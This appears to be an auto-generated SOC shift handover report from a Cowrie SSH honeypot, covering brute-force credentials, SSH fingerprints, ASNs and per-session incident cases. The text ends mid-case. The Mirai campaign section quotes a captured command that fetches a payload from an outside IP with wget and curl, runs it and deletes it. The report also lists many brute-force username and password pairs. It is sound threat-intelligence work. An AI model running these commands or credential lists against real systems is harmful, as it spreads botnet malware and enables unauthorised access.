# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-23 |
| **Generated At** | 2026-08-23T16:30:12Z |
| **Shift Time** | 16:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **189** |
| Confirmed Threats | **163** |
| False Positives Filtered | **26** (13.8%) |
| Unique Attacker IPs | **75** |
| Countries of Origin | **32** |
| High Severity Cases | **117** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **72** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **132** |
| Unique Credential Pairs | **99** |
| Unique Usernames | **25** |
| Unique Passwords | **76** |
| Successful Auth Pairs | **124** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `admin` | 28 |
| `root` | 26 |
| `ubuntu` | 14 |
| `debian` | 12 |
| `administrator` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `debian2003` | 7 |
| `123456` | 6 |
| `supervisor2024` | 6 |
| `ubnt2004` | 6 |
| `password` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `debian` | `debian2003` | 7 |
| `supervisor` | `supervisor2024` | 6 |
| `ubnt` | `ubnt2004` | 6 |
| `admin` | `admin2012` | 5 |
| `debian` | `debian2004` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `testuser` | `123456` | `91.92.47.35` | 2026-08-23T12:55:05 |
| `root` | `11` | `91.92.47.35` | 2026-08-23T12:55:11 |
| `minecraft` | `1234` | `91.92.47.35` | 2026-08-23T12:55:16 |
| `admin1` | `123456` | `91.92.47.35` | 2026-08-23T12:55:21 |
| `user` | `git` | `91.92.47.35` | 2026-08-23T12:55:26 |
| `test` | `123` | `91.92.47.35` | 2026-08-23T12:55:31 |
| `trader` | `trader123` | `91.92.47.35` | 2026-08-23T12:55:37 |
| `root` | `1` | `91.92.47.35` | 2026-08-23T12:55:42 |
| `root` | `999` | `91.92.47.35` | 2026-08-23T12:55:47 |
| `root` | `1qazxsw2` | `91.92.47.35` | 2026-08-23T12:55:52 |
| `web` | `web123` | `91.92.47.35` | 2026-08-23T12:55:58 |
| `test` | `12345678` | `91.92.47.35` | 2026-08-23T12:56:03 |
| `root` | `Admin@123456` | `91.92.47.35` | 2026-08-23T12:56:08 |
| `fastuser` | `123456789` | `91.92.47.35` | 2026-08-23T12:56:13 |
| `admin` | `password` | `91.92.47.35` | 2026-08-23T12:56:18 |
| `hadoop` | `123` | `91.92.47.35` | 2026-08-23T12:56:24 |
| `ubuntu` | `A123456a` | `91.92.47.35` | 2026-08-23T12:56:29 |
| `master` | `qwerty` | `91.92.47.35` | 2026-08-23T12:56:34 |
| `root` | `root123` | `80.94.92.179` | 2026-08-23T12:56:36 |
| `root` | `Aa12345678@` | `91.92.47.35` | 2026-08-23T12:56:40 |
| `root` | `Aa123321` | `91.92.47.35` | 2026-08-23T12:56:45 |
| `es` | `es` | `91.92.47.35` | 2026-08-23T12:56:50 |
| `david` | `david` | `91.92.47.35` | 2026-08-23T12:56:55 |
| `root` | `P@ssw0rd2026` | `91.92.47.35` | 2026-08-23T12:57:00 |
| `rancher` | `rancher` | `91.92.47.35` | 2026-08-23T12:57:05 |
| `trade` | `123456` | `91.92.47.35` | 2026-08-23T12:57:11 |
| `ubuntu` | `Test!123` | `217.60.255.130` | 2026-08-23T12:57:53 |
| `root` | `1q2w3e!Q@W#E` | `217.60.255.130` | 2026-08-23T12:57:56 |
| `root` | `toor` | `80.94.92.179` | 2026-08-23T12:59:35 |
| `admin` | `000000` | `80.94.92.179` | 2026-08-23T13:02:22 |
| `debian` | `debian2003` | `10.0.0.73` | 2026-08-23T13:02:28 |
| `admin` | `111111` | `80.94.92.179` | 2026-08-23T13:04:58 |
| `admin` | `admin2017` | `185.40.122.250` | 2026-08-23T13:05:41 |
| `admin` | `admin2017` | `158.101.138.178` | 2026-08-23T13:05:50 |
| `admin` | `123` | `80.94.92.179` | 2026-08-23T13:07:22 |
| `support` | `support` | `176.53.159.196` | 2026-08-23T13:07:38 |
| `ubuntu` | `ASDF@1234` | `217.60.255.130` | 2026-08-23T13:07:43 |
| `root` | `Passw0rd@123` | `217.60.255.130` | 2026-08-23T13:07:44 |
| `admin` | `123123` | `80.94.92.179` | 2026-08-23T13:09:43 |
| `admin` | `1234` | `80.94.92.179` | 2026-08-23T13:12:12 |
| `admin` | `12345` | `80.94.92.179` | 2026-08-23T13:14:45 |
| `debian` | `debian2003` | `14.97.77.182` | 2026-08-23T13:15:16 |
| `ubuntu` | `Pass@123` | `217.60.255.130` | 2026-08-23T13:17:10 |
| `root` | `cisco@123` | `217.60.255.130` | 2026-08-23T13:17:15 |
| `admin` | `123456` | `80.94.92.179` | 2026-08-23T13:17:39 |
| `debian` | `debian2003` | `117.247.239.202` | 2026-08-23T13:20:13 |
| `debian` | `debian2003` | `119.152.102.54` | 2026-08-23T13:20:19 |
| `debian` | `debian2003` | `88.84.209.146` | 2026-08-23T13:20:26 |
| `debian` | `debian2003` | `125.139.124.120` | 2026-08-23T13:20:26 |
| `admin` | `1234567` | `80.94.92.179` | 2026-08-23T13:20:31 |
| `admin` | `admin2012` | `10.0.0.73` | 2026-08-23T13:21:14 |
| `admin` | `admin2012` | `49.124.147.116` | 2026-08-23T13:22:46 |
| `admin` | `admin2012` | `112.31.93.229` | 2026-08-23T13:22:57 |
| `admin` | `12345678` | `80.94.92.179` | 2026-08-23T13:23:07 |
| `admin` | `123456789` | `80.94.92.179` | 2026-08-23T13:25:33 |
| `ubuntu` | `admin123.` | `217.60.255.130` | 2026-08-23T13:26:44 |
| `root` | `Web@12345` | `217.60.255.130` | 2026-08-23T13:26:52 |
| `admin` | `1q2w3e4r` | `80.94.92.179` | 2026-08-23T13:27:59 |
| `admin` | `654321` | `80.94.92.179` | 2026-08-23T13:30:36 |
| `admin` | `Admin123` | `80.94.92.179` | 2026-08-23T13:33:31 |
| `supervisor` | `supervisor2024` | `10.0.0.73` | 2026-08-23T13:35:05 |
| `ubuntu` | `Linux@123` | `217.60.255.130` | 2026-08-23T13:36:21 |
| `root` | `oracle` | `217.60.255.130` | 2026-08-23T13:36:25 |
| `admin` | `P@ssw0rd` | `80.94.92.179` | 2026-08-23T13:36:33 |
| `admin` | `admin2012` | `117.216.33.31` | 2026-08-23T13:38:09 |
| `admin` | `admin2012` | `82.208.65.46` | 2026-08-23T13:38:17 |
| `admin` | `admin` | `80.94.92.179` | 2026-08-23T13:39:12 |
| `admin` | `passw0rd` | `80.94.92.179` | 2026-08-23T13:41:26 |
| `admin` | `password` | `80.94.92.179` | 2026-08-23T13:43:34 |
| `admin` | `password1` | `80.94.92.179` | 2026-08-23T13:45:47 |
| `ubuntu` | `centos#2024` | `217.60.255.130` | 2026-08-23T13:45:56 |
| `root` | `Qwert@2025` | `217.60.255.130` | 2026-08-23T13:45:59 |
| `ubnt` | `ubnt2004` | `210.4.68.72` | 2026-08-23T13:47:33 |
| `ubnt` | `ubnt2004` | `81.172.74.163` | 2026-08-23T13:47:41 |
| `admin` | `qwerty` | `80.94.92.179` | 2026-08-23T13:47:58 |
| `admin1` | `123123` | `80.94.92.179` | 2026-08-23T13:50:18 |
| `admin1` | `12345` | `80.94.92.179` | 2026-08-23T13:52:39 |
| `supervisor` | `supervisor2024` | `83.177.240.182` | 2026-08-23T13:52:45 |
| `supervisor` | `supervisor2024` | `159.224.97.134` | 2026-08-23T13:52:51 |
| `supervisor` | `supervisor2024` | `212.174.62.233` | 2026-08-23T13:52:57 |
| `supervisor` | `supervisor2024` | `60.172.54.36` | 2026-08-23T13:53:07 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-23T13:54:47 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-23T13:54:47 |
| `admin1` | `123456` | `80.94.92.179` | 2026-08-23T13:55:07 |
| `ubuntu` | `India@1234` | `217.60.255.130` | 2026-08-23T13:55:23 |
| `root` | `Asdfgh@12345` | `217.60.255.130` | 2026-08-23T13:55:27 |
| `admin1` | `password` | `80.94.92.179` | 2026-08-23T13:57:31 |
| `ubnt` | `ubnt2004` | `10.0.0.73` | 2026-08-23T13:58:42 |
| `administrator` | `123123` | `80.94.92.179` | 2026-08-23T13:59:50 |
| `administrator` | `12345` | `80.94.92.179` | 2026-08-23T14:02:13 |
| `administrator` | `123456` | `80.94.92.179` | 2026-08-23T14:04:39 |
| `ubuntu` | `test123` | `217.60.255.130` | 2026-08-23T14:04:59 |
| `root` | `@WSXcde3` | `217.60.255.130` | 2026-08-23T14:05:03 |
| `administrator` | `1234567` | `80.94.92.179` | 2026-08-23T14:07:08 |
| `test` | `test2017` | `10.0.0.73` | 2026-08-23T14:07:33 |
| `administrator` | `12345678` | `80.94.92.179` | 2026-08-23T14:09:44 |
| `default` | `default2000` | `78.189.17.35` | 2026-08-23T14:10:45 |
| `administrator` | `123456789` | `80.94.92.179` | 2026-08-23T14:12:26 |
| `ubuntu` | `123@admin` | `217.60.255.130` | 2026-08-23T14:14:37 |
| `root` | `elastic1234` | `217.60.255.130` | 2026-08-23T14:14:42 |
| `administrator` | `password` | `80.94.92.179` | 2026-08-23T14:15:03 |
| `ubnt` | `ubnt2004` | `186.200.6.38` | 2026-08-23T14:15:16 |
| `ubnt` | `ubnt2004` | `78.72.168.178` | 2026-08-23T14:15:27 |
| `apache` | `12345678` | `80.94.92.179` | 2026-08-23T14:17:45 |
| `unknown` | `unknown2002` | `124.88.174.143` | 2026-08-23T14:20:02 |
| `unknown` | `unknown2002` | `126.13.48.207` | 2026-08-23T14:20:10 |
| `apache` | `password` | `80.94.92.179` | 2026-08-23T14:20:17 |
| `ubuntu` | `Cisco@123` | `217.60.255.130` | 2026-08-23T14:24:21 |
| `root` | `ubnt` | `217.60.255.130` | 2026-08-23T14:24:25 |
| `root` | `admin` | `45.198.224.26` | 2026-08-23T14:25:15 |
| `admin` | `p@ssw0rd` | `45.154.244.193` | 2026-08-23T14:25:16 |
| `debian` | `debian2004` | `10.0.0.73` | 2026-08-23T14:26:03 |
| `debian` | `debian2004` | `93.118.139.170` | 2026-08-23T14:27:44 |
| `debian` | `debian2004` | `182.76.36.62` | 2026-08-23T14:27:54 |
| `unknown` | `unknown2002` | `10.0.0.73` | 2026-08-23T14:31:14 |
| `ubuntu` | `asdfghjkl` | `217.60.255.130` | 2026-08-23T14:34:03 |
| `root` | `nvidia` | `217.60.255.130` | 2026-08-23T14:34:07 |
| `test` | `test2022` | `10.0.0.73` | 2026-08-23T14:40:06 |
| `debian` | `debian2004` | `196.190.180.18` | 2026-08-23T14:43:03 |
| `ubuntu` | `asdf` | `217.60.255.130` | 2026-08-23T14:43:35 |
| `root` | `tools@123` | `217.60.255.130` | 2026-08-23T14:43:39 |
| `unknown` | `qwerty` | `182.60.128.241` | 2026-08-23T14:52:29 |
| `ubuntu` | `admin!23` | `217.60.255.130` | 2026-08-23T14:53:02 |
| `root` | `admin00` | `217.60.255.130` | 2026-08-23T14:53:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **189** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 64 |
| OpenSSH | 36 |
| libssh | 27 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 34 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 27 | 27 |
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `0a07365cc01f...` | Generic scanner | 25 | 1 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 34 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 27 | 27 | Mirai/variant |
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 25 | 1 | Generic scanner |
| `95420f9d932d...` | OpenSSH | 9 | 4 | — |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Recon Loader Script** | 🟡 MEDIUM | 34 | 1 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **75** |
| Unique ASNs | **56** |
| High-Risk ASNs | **44** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS3301` | Telia Company AB | 4 | HIGH |
| `AS12389` | PJSC Rostelecom | 3 | HIGH |
| `AS9829` | National Internet Backbone | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS209334` | Modat B.V. | 2 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (117)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-13bd68891524

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:05` | `cowrie.session.connect` |
| `2026-08-23 12:55:05` | `cowrie.client.version` |
| `2026-08-23 12:55:05` | `cowrie.client.kex` |
| `2026-08-23 12:55:05` | `cowrie.login.success` |
| `2026-08-23 12:55:06` | `cowrie.session.params` |
| `2026-08-23 12:55:06` | `cowrie.command.input` |
| `2026-08-23 12:55:06` | `cowrie.log.closed` |
| `2026-08-23 12:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2bf7db21499

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:10` | `cowrie.session.connect` |
| `2026-08-23 12:55:10` | `cowrie.client.version` |
| `2026-08-23 12:55:10` | `cowrie.client.kex` |
| `2026-08-23 12:55:11` | `cowrie.login.success` |
| `2026-08-23 12:55:12` | `cowrie.session.params` |
| `2026-08-23 12:55:12` | `cowrie.command.input` |
| `2026-08-23 12:55:12` | `cowrie.log.closed` |
| `2026-08-23 12:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e491bcadc917

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:15` | `cowrie.session.connect` |
| `2026-08-23 12:55:15` | `cowrie.client.version` |
| `2026-08-23 12:55:15` | `cowrie.client.kex` |
| `2026-08-23 12:55:16` | `cowrie.login.success` |
| `2026-08-23 12:55:17` | `cowrie.session.params` |
| `2026-08-23 12:55:17` | `cowrie.command.input` |
| `2026-08-23 12:55:17` | `cowrie.log.closed` |
| `2026-08-23 12:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80c63c62de7c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:21` | `cowrie.session.connect` |
| `2026-08-23 12:55:21` | `cowrie.client.version` |
| `2026-08-23 12:55:21` | `cowrie.client.kex` |
| `2026-08-23 12:55:21` | `cowrie.login.success` |
| `2026-08-23 12:55:22` | `cowrie.session.params` |
| `2026-08-23 12:55:22` | `cowrie.command.input` |
| `2026-08-23 12:55:22` | `cowrie.log.closed` |
| `2026-08-23 12:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4838c42c5c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:26` | `cowrie.session.connect` |
| `2026-08-23 12:55:26` | `cowrie.client.version` |
| `2026-08-23 12:55:26` | `cowrie.client.kex` |
| `2026-08-23 12:55:26` | `cowrie.login.success` |
| `2026-08-23 12:55:27` | `cowrie.session.params` |
| `2026-08-23 12:55:27` | `cowrie.command.input` |
| `2026-08-23 12:55:27` | `cowrie.log.closed` |
| `2026-08-23 12:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bd0aa83023b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:31` | `cowrie.session.connect` |
| `2026-08-23 12:55:31` | `cowrie.client.version` |
| `2026-08-23 12:55:31` | `cowrie.client.kex` |
| `2026-08-23 12:55:31` | `cowrie.login.success` |
| `2026-08-23 12:55:32` | `cowrie.session.params` |
| `2026-08-23 12:55:32` | `cowrie.command.input` |
| `2026-08-23 12:55:32` | `cowrie.log.closed` |
| `2026-08-23 12:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7636e5f1eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:36` | `cowrie.session.connect` |
| `2026-08-23 12:55:36` | `cowrie.client.version` |
| `2026-08-23 12:55:36` | `cowrie.client.kex` |
| `2026-08-23 12:55:37` | `cowrie.login.success` |
| `2026-08-23 12:55:37` | `cowrie.session.params` |
| `2026-08-23 12:55:37` | `cowrie.command.input` |
| `2026-08-23 12:55:38` | `cowrie.log.closed` |
| `2026-08-23 12:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7e61683b203

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:41` | `cowrie.session.connect` |
| `2026-08-23 12:55:41` | `cowrie.client.version` |
| `2026-08-23 12:55:41` | `cowrie.client.kex` |
| `2026-08-23 12:55:42` | `cowrie.login.success` |
| `2026-08-23 12:55:43` | `cowrie.session.params` |
| `2026-08-23 12:55:43` | `cowrie.command.input` |
| `2026-08-23 12:55:43` | `cowrie.log.closed` |
| `2026-08-23 12:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e3726b70b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:47` | `cowrie.session.connect` |
| `2026-08-23 12:55:47` | `cowrie.client.version` |
| `2026-08-23 12:55:47` | `cowrie.client.kex` |
| `2026-08-23 12:55:47` | `cowrie.login.success` |
| `2026-08-23 12:55:48` | `cowrie.session.params` |
| `2026-08-23 12:55:48` | `cowrie.command.input` |
| `2026-08-23 12:55:48` | `cowrie.log.closed` |
| `2026-08-23 12:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34bfafa35cff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:52` | `cowrie.session.connect` |
| `2026-08-23 12:55:52` | `cowrie.client.version` |
| `2026-08-23 12:55:52` | `cowrie.client.kex` |
| `2026-08-23 12:55:52` | `cowrie.login.success` |
| `2026-08-23 12:55:53` | `cowrie.session.params` |
| `2026-08-23 12:55:53` | `cowrie.command.input` |
| `2026-08-23 12:55:53` | `cowrie.log.closed` |
| `2026-08-23 12:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-420dbdefacc5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:57` | `cowrie.session.connect` |
| `2026-08-23 12:55:57` | `cowrie.client.version` |
| `2026-08-23 12:55:57` | `cowrie.client.kex` |
| `2026-08-23 12:55:58` | `cowrie.login.success` |
| `2026-08-23 12:55:58` | `cowrie.session.params` |
| `2026-08-23 12:55:58` | `cowrie.command.input` |
| `2026-08-23 12:55:58` | `cowrie.log.closed` |
| `2026-08-23 12:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3640283da35b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:56:02` | `cowrie.session.connect` |
| `2026-08-23 12:56:02` | `cowrie.client.version` |
| `2026-08-23 12:56:02` | `cowrie.client.kex` |
| `2026-08-23 12:56:03` | `cowrie.login.success` |
| `2026-08-23 12:56:03` | `cowrie.session.params` |
| `2026-08-23 12:56:03` | `cowrie.command.input` |
| `2026-08-23 12:56:03` | `cowrie.log.closed` |
| `2026-08-23 12:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09c9f32f2a07

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:56 |
| **Last Seen** | 2026-08-23 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
